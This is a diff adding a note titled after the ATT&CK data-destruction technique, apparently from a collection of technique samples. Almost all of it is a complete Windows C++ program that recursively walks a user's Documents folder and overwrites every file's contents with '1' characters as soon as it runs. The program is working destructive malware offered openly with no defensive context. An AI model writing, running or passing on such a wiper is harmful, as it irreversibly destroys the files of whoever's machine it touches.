@@ -1,0 +1,59 @@
+---
+title: "T1485.Data Destruction "
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <filesystem>
+#include <string>
+namespace fs = std::filesystem;
+
+void convertFilesToOnes(const std::string& folderPath) {
+    for (const auto& entry : fs::recursive_directory_iterator(folderPath)) {
+        if (!entry.is_regular_file()) {
+            // Ignoruj katalogi i inne niepliki
+            continue;
+        }
+
+        std::string filePath = entry.path().string();
+
+        std::ifstream inputFile(filePath, std::ios::binary);
+        if (!inputFile.is_open()) {
+            std::cerr << "Nie można otworzyć pliku: " << filePath << std::endl;
+            continue;
+        }
+
+        std::string fileContents((std::istreambuf_iterator<char>(inputFile)),
+            (std::istreambuf_iterator<char>()));
+
+        inputFile.close();
+
+        // Zamień każdy bit w pliku na '1'
+        for (char& c : fileContents) {
+            c = '1';
+        }
+
+        std::ofstream outputFile(filePath, std::ios::binary);
+        if (!outputFile.is_open()) {
+            std::cerr << "Nie można zapisać do pliku: " << filePath << std::endl;
+            continue;
+        }
+
+        outputFile.write(fileContents.c_str(), fileContents.size());
+        outputFile.close();
+
+        std::cout << "Zmodyfikowano plik: " << filePath << std::endl;
+    }
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    std::string folderPath = "C:\\Users\\User\\Documents";
+    convertFilesToOnes(folderPath);
+    return 0;
+}
